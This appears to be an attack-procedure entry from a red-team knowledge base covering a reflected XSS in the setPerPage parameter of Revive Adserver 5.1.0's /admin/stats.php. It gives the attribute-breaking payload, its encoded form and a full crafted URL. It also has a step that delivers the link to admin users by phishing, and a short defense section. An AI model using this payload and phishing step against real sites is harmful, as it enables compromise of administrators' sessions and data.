---
id: proc-uuid-1234
tags:
  - xss
  - payload-injection
  - url-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.745Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-setPerPage-Parameter

## Summary

This procedure crafts a malicious URL for the Revive Adserver /admin/stats.php endpoint, injecting a JavaScript payload into the setPerPage parameter to embed onclick and accesskey attributes in a reflected HTML input field, setting up for later execution.

## Description

In Revive Adserver 5.1.0, the setPerPage parameter in /admin/stats.php is reflected into an HTML input without proper sanitization or encoding, allowing attackers to inject event handlers like onclick. The attack targets admin users by luring them to a crafted URL, where the payload hides in plain sight until triggered. Prerequisites include knowledge of the target's instance URL and a way to deliver the link (e.g., email). Expected outcome: Payload reflected in page source, ready for activation, potentially leading to JavaScript execution for data theft.

## Requirements

1. Access to a vulnerable Revive Adserver 5.1.0 instance (internet connectivity sufficient)
2. Web browser for testing payload reflection
3. Social engineering vector to deliver URL to authenticated admin

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., htmlspecialchars) for all parameters rendered in HTML attributes
- Use Content Security Policy (CSP) to block inline JavaScript execution
- Monitor access logs for anomalous /admin/stats.php queries with unusual setPerPage values

## Objectives

1. Embed malicious JavaScript attributes in the reflected input field
2. Ensure payload survives URL decoding and page rendering
3. Position for non-interactive trigger via accesskey

## Instructions

### Step 1: Craft the Payload

**Context**: Build the injection string to close the attribute quote, add onclick event, and assign accesskey for triggering.

Base payload: ' onclick=alert(document.domain) accesskey=X

URL-encode: %27%20onclick=alert(document.domain)%20accesskey=X%20

Append to setPerPage=15 (default value) in the full endpoint URL.

Full example URL:

```url
http://target.com/admin/stats.php?statsBreakdown=day&listorder=key&orderdirection=up&day=&setPerPage=15%27%20onclick=alert(document.domain)%20accesskey=X%20&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020
```

> This injects the payload into <input value="15' onclick=alert(document.domain) accesskey=X ">. Test by accessing the URL and inspecting the page source.

### Step 2: Deliver the URL

**Context**: Send the crafted link to the victim to ensure they load the vulnerable page with the reflected payload.

Use phishing email or direct link sharing targeting admin users.

> Victim accesses the page; no execution yet, but payload is now in DOM.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- injection
- web-exploit
